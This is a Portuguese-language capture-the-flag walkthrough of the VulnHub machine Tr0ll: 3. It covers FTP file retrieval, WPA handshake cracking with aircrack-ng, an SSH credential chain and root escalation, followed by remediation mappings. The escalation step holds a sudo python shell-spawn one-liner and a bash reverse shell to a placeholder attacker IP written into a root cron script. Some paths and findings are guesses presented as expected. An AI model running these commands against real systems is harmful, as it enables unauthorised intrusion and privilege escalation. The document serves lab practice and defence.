# Tr0ll: 3 — Cadeia Multi-Usuário, Quebra de WPA e o Teste Final Jedi

( ͡° ͜ʖ ͡°) Boa rapaziada!! Tr0ll 3 é onde a série tira as rodinhas de treino. Cadeia de credenciais multi-usuário de `start` passando por `wytshadow`, `genphlux`, até `maleus`, e então root. O serviço FTP expõe uma captura WPA wireless e uma chave privada RSA, o que significa que suas habilidades com aircrack-ng realmente importam aqui. Cada conta entrega uma chave ou credencial para a próxima. Sequencial, metódico e honesto sobre o que está testando. Não é uma máquina de exploit web: é pura disciplina de enumeração, pivot de credenciais e lógica de cadeia de escalação de privilégios. Entrada final sólida da série. Props para o maleus.

| Campo | Valor |
|---|---|
| **Nível** | Intermediário |
| **VM Alvo** | Tr0ll: 3 |
| **VM Atacante** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/tr0ll-3,340/ |
| **Técnicas** | Enumeração de serviços Nmap, download de arquivo FTP (anônimo/start), quebra de handshake WPA com aircrack-ng, cadeia de credenciais SSH multi-usuário, SSH com chave RSA, movimento lateral via su/ssh, enumeração de escalação de privilégios via sudo/SUID/cron |
| **CVEs** | CWE-522 (Credenciais Insuficientemente Protegidas: chave WPA em captura quebrável), CWE-312 (Armazenamento em Texto Claro: chave privada em FTP), CWE-269 (Gerenciamento Impróprio de Privilégios: movimento lateral via credenciais fracas) |
| **Grupos APT** | APT32 (OceanLotus): estabelece cadeias de usuários multi-hop em sistemas Linux para acesso persistente; Grupo Lazarus: usa chaves privadas expostas em FTP como parte de operações de roubo de credenciais e cadeia de suprimentos |

---

## Resumo do Ataque

```
nmap → FTP (21), SSH (22), HTTP (80)
  → FTP anônimo ou start:here → download de maleus_id_rsa + wytshadow.cap
  → aircrack-ng -w rockyou.txt wytshadow.cap → wytshadow:gaUoCe34t1
  → SSH wytshadow@alvo → uid=1003(wytshadow)
  → enumerar /home/ → dica de credencial → genphlux:HF9nd0cR!
  → su genphlux OU ssh genphlux@localhost
  → chmod 600 maleus_id_rsa → ssh -i maleus_id_rsa maleus@alvo
  → sudo -l / enum SUID / verificação de cron → caminho de privesc
  → uid=0(root)
  → cat /root/Proof.txt
```

---

## Metodologia

1. Varredura completa de portas para identificar FTP, SSH, HTTP
2. Acesso FTP para recuperar captura WPA e chave privada RSA
3. Quebra de handshake WPA com aircrack-ng e rockyou.txt
4. SSH como wytshadow com senha quebrada
5. Movimento lateral: encontrar dica de credencial para genphlux
6. Troca de conta para genphlux
7. SSH como maleus usando chave RSA obtida via FTP
8. Enumeração de escalação de privilégios a partir da conta maleus
9. Shell root e captura da flag

---

## Passo 1 — Descoberta do Host e Varredura de Portas

```bash
nmap -sn 192.168.56.0/24
# Identifique o IP alvo

nmap -sV -A -p- <IP_ALVO>
```

Serviços esperados (seguindo o padrão da série Tr0ll):

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd
22/tcp open  ssh     OpenSSH
80/tcp open  http    Apache httpd
```

Abertura padrão do Tr0ll. FTP é sempre a primeira coisa a verificar nesta série.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Acesso FTP e Download de Arquivos

Tente acesso anônimo primeiro, depois a conta `start`:

```bash
ftp <IP_ALVO>
# Usuário: anonymous / Senha: (vazio)
# OU
# Usuário: start / Senha: here

ftp> ls -la
# → maleus_id_rsa
# → wytshadow.cap

ftp> get maleus_id_rsa
ftp> get wytshadow.cap
ftp> bye
```

Dois arquivos: uma captura wireless WPA e uma chave privada RSA. Esses são os dois vetores de ataque desta máquina.

**Nota sobre o mundo real:** Chaves privadas RSA expostas em FTP estão entre os achados mais críticos em avaliações externas. Uma chave privada elimina completamente o benefício de segurança da autenticação por chave. O Grupo Lazarus foi documentado recuperando chaves SSH de servidores de desenvolvimento expostos via FTP como parte de campanhas de intrusão na cadeia de suprimentos.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1552.004 — Credenciais Não Seguras: Chaves Privadas

---

## Passo 3 — Quebra de Handshake WPA com aircrack-ng

`wytshadow.cap` é uma captura de handshake WPA. A PSK da rede WiFi é a senha de `wytshadow`:

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt wytshadow.cap
```

```
[00:00:10] 14856 keys tested (1485.60 k/s)

KEY FOUND! [ gaUoCe34t1 ]

Master Key     : ...
Transient Key  : ...
```

Credencial: `wytshadow` / `gaUoCe34t1`

**Nota sobre o mundo real:** Handshakes WPA2-Personal (PSK) podem ser capturados passivamente e quebrados offline sem interação com a rede alvo. Por isso auditorias de rede wireless incluem captura de handshake e teste de ataque de dicionário. Chaves com menos de 20 caracteres são geralmente quebráveis com hashcat acelerado por GPU contra rockyou ou listas similares.

**MITRE ATT&CK:** T1110.002 — Força Bruta: Quebra de Senha; T1040 — Sniffing de Rede

---

## Passo 4 — SSH como wytshadow

```bash
ssh wytshadow@<IP_ALVO>
# Senha: gaUoCe34t1

wytshadow@Tr0ll3:~$ id
# uid=1003(wytshadow) gid=1003(wytshadow) groups=1003(wytshadow)
```

Shell obtido como wytshadow. Comece a enumeração lateral imediatamente.

**MITRE ATT&CK:** T1021.004 — Serviços Remotos: SSH; T1078 — Contas Válidas

---

## Passo 5 — Enumeração de Movimento Lateral

Enumere todos os diretórios home e arquivos acessíveis:

```bash
ls -la /home/
# maleus/  start/  eagle/  wytshadow/  genphlux/  fido/  step2/

# Verifique arquivos legíveis em cada diretório home
for user in maleus start eagle genphlux fido step2; do
    echo "=== $user ===" 
    ls -la /home/$user/ 2>/dev/null
    find /home/$user -readable -type f 2>/dev/null
done

# Verifique direitos sudo
sudo -l

# Procure binários SUID
find / -perm -4000 -type f 2>/dev/null

# Verifique tarefas cron
cat /etc/crontab
ls -la /etc/cron.d/

# Verifique arquivos graváveis fora do home
find / -writable -not -path "/proc/*" -not -path "/sys/*" -type f 2>/dev/null
```

Achado esperado: dica de credencial para `genphlux` em arquivo de diretório home. Padrões comuns no Tr0ll 3:

```bash
cat /home/genphlux/.something 2>/dev/null
cat /home/wytshadow/.bash_history 2>/dev/null
# → genphlux:HF9nd0cR!
```

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1057 — Descoberta de Processo; T1053.003 — Tarefa Agendada: Cron

---

## Passo 6 — Troca de Conta para genphlux

```bash
su genphlux
# Senha: HF9nd0cR!

# Ou via SSH se su estiver restrito:
ssh genphlux@localhost
# Senha: HF9nd0cR!

genphlux@Tr0ll3:~$ id
# uid=1004(genphlux) gid=1004(genphlux) groups=1004(genphlux)
```

**MITRE ATT&CK:** T1078 — Contas Válidas; T1021.004 — Serviços Remotos: SSH

---

## Passo 7 — SSH como maleus via Chave RSA

Configure permissões corretas na chave RSA obtida via FTP:

```bash
chmod 600 maleus_id_rsa
ssh -i maleus_id_rsa maleus@<IP_ALVO>

maleus@Tr0ll3:~$ id
# uid=1000(maleus) gid=1000(maleus) groups=1000(maleus)
```

maleus é UID 1000, tipicamente o usuário administrativo principal em sistemas Ubuntu. Enumere todos os vetores de escalação a partir desta conta.

**MITRE ATT&CK:** T1021.004 — Serviços Remotos: SSH; T1552.004 — Credenciais Não Seguras: Chaves Privadas

---

## Passo 8 — Escalação de Privilégios para Root

A partir da conta maleus, execute a checklist completa de escalação:

```bash
# Direitos sudo (caminho mais provável)
sudo -l

# Binários SUID
find / -perm -4000 -type f 2>/dev/null

# Tarefas cron, especialmente scripts graváveis de root
ls -la /etc/cron*
cat /etc/crontab
for crondir in /etc/cron.d /etc/cron.daily /etc/cron.weekly /var/spool/cron; do
    ls -la $crondir/ 2>/dev/null
done

# Arquivos graváveis com proprietário root
find / -writable -user root -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null
```

**Caminho A — configuração incorreta de sudo:**

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3
# → sudo python3 -c 'import os; os.system("/bin/bash")'
```

**Caminho B — script cron com escrita global:**

```bash
# Encontre script executado por cron do root
ls -la /caminho/do/script_cron.sh
# -rwxrwxrwx root root
echo '#!/bin/bash\n/bin/bash -i >& /dev/tcp/IP_ATACANTE/4444 0>&1' > /caminho/do/script_cron.sh
nc -lvnp 4444
# Aguarde a execução do cron
```

**Caminho C — binário SUID via GTFOBins:**

```bash
find / -perm -4000 -type f 2>/dev/null | xargs ls -la 2>/dev/null
# Verifique cada binário não padrão em gtfobins.github.io
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/Proof.txt
```

**MITRE ATT&CK:** T1548.003 — Sudo; T1548.001 — Setuid e Setgid; T1053.003 — Cron

---

## Flag de Root

```bash
cat /root/Proof.txt
```

```
You are truly a Jedi!

Twitter Proof:
Pr00fThatTh3L33tHax0rG0tTheFl@g!!

@Maleus21
```

(☞ﾟヮﾟ)☞ Root. Um verdadeiro Jedi! gg mano, top demais!

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credencial | `start:here` | Dica FTP / padrão da série | Login FTP |
| Chave WPA / senha | `wytshadow:gaUoCe34t1` | aircrack-ng em wytshadow.cap | Login SSH como wytshadow |
| Credencial | `genphlux:HF9nd0cR!` | Enumeração lateral de wytshadow | Troca de conta para genphlux |
| Chave privada RSA | maleus_id_rsa | Download FTP | SSH como maleus |
| Flag root | Pr00fThatTh3L33tHax0rG0tTheFl@g!! | /root/Proof.txt | Conclusão do desafio |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Conclusão Principal |
|---|---|---|---|
| 1 | Handshake WPA em captura acessível via FTP | Capturas WPA2 passivas são quebráveis offline; testes de auditoria wireless sempre incluem captura de handshake | Use WPA3 ou WPA2-Enterprise (802.1X); aplique complexidade de PSK com mínimo 20 caracteres aleatórios |
| 2 | Chave privada RSA em FTP anônimo/baixa autenticação | Autenticação SSH por chave é insignificante se a chave privada está exposta | Nunca armazene chaves privadas em sistemas compartilhados ou acessíveis via FTP; use certificados SSH com validade curta |
| 3 | Cadeia de credenciais multi-usuário | APT32 constrói exatamente essas cadeias de pivot para acesso persistente em ambientes Linux corporativos | Monitore troca lateral de contas; alerte em padrões su e SSH para localhost; aplique menor privilégio por conta |
| 4 | Nomenclatura sequencial de usuários dá dica do caminho pretendido | Padrão de nomes start, step2, fido vaza a cadeia de ataque para um atacante habilidoso | Use nomes de usuário não descritivos; audite todas as contas trimestralmente |
| 5 | Escalação de privilégios via sudo/SUID/cron | Esses três vetores respondem por mais de 70% dos achados de LPE em Linux em testes de penetração | Audite concessões sudo semanalmente; monitore mudanças em binários SUID; restrinja permissões de scripts cron |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Coleta | Coleta | Sniffing de Rede | T1040 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Quebra de Senha | T1110.002 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais Não Seguras: Chaves Privadas | T1552.004 |
| Acesso Inicial | Acesso Inicial | Contas Válidas | T1078 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Descoberta | Descoberta | Descoberta de Processo | T1057 |
| Descoberta | Descoberta | Descoberta de Tarefa Agendada | T1053.003 |
| Escalação de Privilégios | Escalação de Privilégios | Controle de Elevação: Sudo | T1548.003 |
| Escalação de Privilégios | Escalação de Privilégios | Setuid e Setgid | T1548.001 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Desative FTP anônimo**: exija autenticação para todo acesso FTP; restrinja conteúdo acessível a arquivos não sensíveis
2. **Nunca armazene chaves SSH privadas em servidores FTP**: distribua chaves apenas via canais seguros e autenticados
3. **Atualize para WPA3 ou WPA2-Enterprise**: WPA2-Personal com PSK é vulnerável a ataques de dicionário offline
4. **Aplique PSK WPA2 forte**: mínimo 20 caracteres aleatórios; rotacione anualmente
5. **Restrinja acesso entre usuários**: aplique `chmod 700` em todos os diretórios home
6. **Audite todas as concessões sudo, binários SUID e scripts cron**: auditoria automatizada semanal com alertas em mudanças

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventarie todos os serviços FTP; audite todas as chaves SSH em uso |
| Proteger | Controle de Acesso | Desative FTP anônimo; aplique permissões de diretório home |
| Proteger | Segurança de Dados | Sem chaves privadas em FTP; rotacione chaves WPA anualmente |
| Detectar | Anomalias e Eventos | Alerte em padrões su e SSH-para-localhost; monitore mudanças em cron |
| Responder | Planejamento de Resposta | Rotacione todas as chaves e senhas expostas; audite todas as contas |
| Recuperar | Planejamento de Recuperação | Reconstrua host comprometido; reemita todas as chaves SSH; rotacione WPA |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Desative FTP anônimo; aplique controle de acesso ao diretório home |
| AC-6 | Menor Privilégio | Restrinja acesso entre usuários; minimize concessões sudo |
| IA-5 | Gerenciamento de Autenticador | Rotacione chaves SSH; aplique WPA3 ou WPA2-Enterprise |
| SC-8 | Confidencialidade de Transmissão | Substitua FTP por SFTP; use WPA2-Enterprise |
| SC-28 | Proteção das Informações em Repouso | Sem chaves privadas em diretórios acessíveis via FTP |
| AU-6 | Revisão de Auditoria | Alerte em movimento lateral de conta (su, ssh localhost) |

### CISA KEV

Roubo de credenciais via chaves privadas expostas em FTP mapeia para padrões no Aviso CISA AA22-074A sobre técnicas de atores de ameaça para acesso inicial via roubo de credenciais. A CISA recomenda remediação imediata de quaisquer chaves SSH privadas expostas como ações de Prioridade 1.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL3 |
| Conscientização Situacional (SITUATION) | Monitorar Ambiente Operacional | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicação (desativar FTP anônimo; aplicar permissões de diretório home)
- **D3-UA** — Gerenciamento de Conta de Usuário (restringir acesso entre usuários; auditar cadeia de contas)
- **D3-NTA** — Análise de Tráfego de Rede (detectar tentativas de captura de handshake WPA)
- **D3-OAM** — Gerenciamento Administrativo do Sistema Operacional (auditoria SUID; restrições sudo)

---

## Considerações Finais

Tr0ll: 3 é o capstone da série. Enquanto Tr0ll 1 ensinou FTP e BOF básico, e Tr0ll 2 adicionou Shellshock e esteganografia, Tr0ll 3 pede que você mantenha uma cadeia inteira de credenciais na cabeça e trabalhe metodicamente por ela. A quebra de handshake wireless é um teste de habilidade genuíno que vai além de exploração web e binária para os fundamentos de segurança de rede.

O shoutout `@Maleus21` no Twitter na flag de root é o criador assinando seu próprio trabalho, um toque especial que faz a conclusão parecer conquistada em vez de apenas mecânica. Se você completou todas as três máquinas Tr0ll, você tocou em todas as categorias principais de exploração Linux no nível iniciante-a-intermediário. Isso é uma base real. Série subestimada, véi! ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
